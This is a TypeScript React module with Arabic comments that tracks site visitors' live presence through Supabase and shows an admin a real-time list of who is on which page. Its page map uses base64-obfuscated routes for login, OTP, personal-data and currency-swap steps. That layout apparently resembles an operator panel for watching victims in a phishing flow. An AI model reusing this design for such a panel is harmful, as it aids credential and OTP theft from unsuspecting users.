import { useEffect, useRef, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { getSessionId } from "@/lib/session-id";

const CHANNEL = "sham-online";
const HEARTBEAT_MS = 8000; // ينعش الوقت "at" حتى لا يبدو العميل قديماً وهو متصل
const STALE_MS = 25000; // أي إدخال حضور لم يتحدث خلال هذه المدة يُعتبر منقطعاً

/** يسجّل حضور الزائر الحالي في قناة الحضور اللحظي، مع نبضات دورية وتحديث فوري عند تغيّر الصفحة/البريد. */
export function usePresenceTracker(meta: { page: string; email?: string | null }) {
  const idRef = useRef<string>(
    typeof crypto !== "undefined" && "randomUUID" in crypto
      ? crypto.randomUUID()
      : String(Math.random()),
  );
  const chRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
  const readyRef = useRef(false);
  const metaRef = useRef<{ page: string; email: string | null; sessionId: string | null }>({
    page: meta.page,
    email: meta.email ?? null,
    sessionId: typeof window !== "undefined" ? getSessionId() : null,
  });
  let storedEmail: string | null = null;
  if (typeof window !== "undefined") {
    try { storedEmail = window.localStorage.getItem("sham_email")?.trim().toLowerCase() || null; } catch { /* ignore */ }
  }
  metaRef.current = {
    page: meta.page,
    email: meta.email ?? storedEmail,
    sessionId: typeof window !== "undefined" ? getSessionId() : null,
  };

  useEffect(() => {
    const push = () => {
      const ch = chRef.current;
      if (!ch || !readyRef.current) return;
      const m = metaRef.current;
      // أمان: قناة الحضور عامة — لا يُبثّ البريد فيها إطلاقاً، فقط معرّف جلسة مبهم والصفحة.
      void ch.track({ page: m.page, sessionId: m.sessionId, email: null, at: new Date().toISOString() });
    };

    const channel = supabase.channel(CHANNEL, {
      config: { presence: { key: idRef.current } },
    });
    chRef.current = channel;
    channel.subscribe((status) => {
      if (status === "SUBSCRIBED") {
        readyRef.current = true;
        push();
      }
    });

    const hb = window.setInterval(push, HEARTBEAT_MS);
    // التبويب المخفي/المغلق لا يُحسب متصلاً فعلياً
    const onVis = () => {
      if (document.visibilityState === "visible") push();
      else void chRef.current?.untrack();
    };
    const onHide = () => { void chRef.current?.untrack(); };
    window.addEventListener("pagehide", onHide);
    const onFocus = () => push();
    document.addEventListener("visibilitychange", onVis);
    window.addEventListener("focus", onFocus);
    window.addEventListener("online", onFocus);

    return () => {
      window.clearInterval(hb);
      document.removeEventListener("visibilitychange", onVis);
      window.removeEventListener("focus", onFocus);
      window.removeEventListener("online", onFocus);
      window.removeEventListener("pagehide", onHide);
      readyRef.current = false;
      supabase.removeChannel(channel).catch(() => {});
      chRef.current = null;
    };
  }, []);

  // تحديث فوري عند تغيّر الصفحة أو البريد أو الجلسة — بدون إعادة اشتراك حتى لا يومض «غير متصل».
  useEffect(() => {
    const ch = chRef.current;
    if (!ch || !readyRef.current) return;
    const m = metaRef.current;
    void ch.track({ page: m.page, sessionId: m.sessionId, email: null, at: new Date().toISOString() });
  }, [meta.page, meta.email]);
}

export type OnlineVisitor = {
  key: string;
  page: string;
  email: string | null;
  sessionId: string | null;
  at: string;
  sinceAt: string;
};

/**
 * اشتراك واحد مشترك في قناة الحضور — يمكن استدعاء الخطّاف في أكثر من مكان
 * بنفس الصفحة دون إعادة الاشتراك (كان ذلك يسبّب تعطّل لوحة التحكم).
 */
type WatcherChannel = ReturnType<typeof supabase.channel>;
let watcherChannel: WatcherChannel | null = null;
let watcherCount = 0;
const watcherListeners = new Set<(v: OnlineVisitor[]) => void>();
let latestVisitors: OnlineVisitor[] = [];
let lastSig = "";
let watcherTicker: ReturnType<typeof setInterval> | null = null;
// بداية الجلسة لكل شخص — تُحفظ طوال اتصاله ثم تُنسى عند انقطاعه حتى
// تُحسب الجلسة التالية من جديد.
const sessionStart = new Map<string, string>();

function computeAndBroadcast() {
  const channel = watcherChannel;
  if (!channel) return;
  const state = channel.presenceState<{
    page: string;
    email: string | null;
    sessionId?: string | null;
    at: string;
  }>();
  const now = Date.now();
  const list: Array<OnlineVisitor & { _personId: string }> = [];
  Object.entries(state).forEach(([key, entries]) => {
    if (key === "admin-watcher") return;
    // أحدث نبضة لكل تبويب
    const latest = (entries ?? []).reduce<
      { page: string; email: string | null; sessionId?: string | null; at: string } | null
    >((a, m) => (!a || Date.parse(m.at ?? "") >= Date.parse(a.at ?? "") ? m : a), null);
    if (!latest) return;
    const ts = Date.parse(latest.at ?? "");
    if (!Number.isFinite(ts) || now - ts > STALE_MS) return; // حضور قديم لم يُحدَّث → يُعامل كمنقطع
    const personId = (latest.sessionId ?? "") || (latest.email ?? "") || key;
    list.push({
      key,
      page: latest.page,
      email: latest.email ?? null,
      sessionId: latest.sessionId ?? null,
      at: latest.at,
      sinceAt: latest.at, // قيمة مبدئية — تُستبدل أدناه ببداية الجلسة الفعلية
      _personId: personId,
    });
  });
  // شخص واحد بعدة تبويبات = متصل واحد (نحتفظ بأحدث نبضة لكل جلسة)
  const byPerson = new Map<string, OnlineVisitor & { _personId: string }>();
  for (const v of list) {
    const prev = byPerson.get(v._personId);
    if (!prev || Date.parse(v.at) > Date.parse(prev.at)) byPerson.set(v._personId, v);
  }
  // تحديث سجل بدايات الجلسات: جديد يأخذ وقت الآن، منقطع يُزال.
  const seen = new Set(byPerson.keys());
  for (const id of sessionStart.keys()) if (!seen.has(id)) sessionStart.delete(id);
  const next: OnlineVisitor[] = [];
  for (const [id, v] of byPerson.entries()) {
    let start = sessionStart.get(id);
    if (!start) { start = v.at; sessionStart.set(id, start); }
    next.push({ key: v.key, page: v.page, email: v.email, sessionId: v.sessionId, at: v.at, sinceAt: start });
  }
  const sig = next.map((v) => `${v.key}|${v.page}|${v.email}|${v.sessionId}|${v.at}|${v.sinceAt}`).sort().join(";");
  // لا نعيد رسم لوحة التحكم إن لم يتغيّر شيء فعلياً
  if (sig === lastSig) return;
  lastSig = sig;
  latestVisitors = next;
  watcherListeners.forEach((fn) => fn(latestVisitors));
}

function startWatcher() {
  if (watcherChannel) return;
  const channel = supabase.channel(CHANNEL, {
    config: { presence: { key: "admin-watcher" } },
  });
  watcherChannel = channel;
  channel
    .on("presence", { event: "sync" }, computeAndBroadcast)
    .on("presence", { event: "join" }, computeAndBroadcast)
    .on("presence", { event: "leave" }, computeAndBroadcast)
    .subscribe();
  // نمرّ دورياً لإسقاط الحضور الذي لم تصل مغادرته (شبكة ضعيفة/إغلاق مفاجئ للتبويب).
  watcherTicker = setInterval(computeAndBroadcast, 3000);
}

/** يقرأ عدد المتصلين لحظياً وقائمتهم */
export function useOnlineVisitors() {
  const [visitors, setVisitors] = useState<OnlineVisitor[]>(latestVisitors);

  useEffect(() => {
    watcherCount += 1;
    startWatcher();
    watcherListeners.add(setVisitors);
    setVisitors(latestVisitors);
    return () => {
      watcherListeners.delete(setVisitors);
      watcherCount -= 1;
      if (watcherCount === 0 && watcherChannel) {
        supabase.removeChannel(watcherChannel).catch(() => {});
        watcherChannel = null;
        latestVisitors = [];
        lastSig = "";
        if (watcherTicker) { clearInterval(watcherTicker); watcherTicker = null; }
      }
    };
  }, []);

  return visitors;
}

export const pageLabels: Record<string, string> = {
  "/": "الرئيسية",
  "/YXV0aA": "تسجيل الدخول",
  "/b3Rw": "رمز التحقق",
  "/dmVyaWZ5": "البيانات الشخصية",
  "/cGVuZGluZw": "بانتظار التحقق",
  "/cmV2aWV3": "متابعة الطلب",
  "/c3dhcA": "تبديل العملة",
  "/c3VjY2Vzcw": "تم بنجاح",
  "/Y29tcGxldGU": "استكمال الإجراءات",
  "/bG9nb3V0LWRldmljZXM": "تسجيل الخروج من الأجهزة",
  "/ZGFzaGJvYXJk": "لوحة التحكم",
  "/admin": "لوحة التحكم",
};
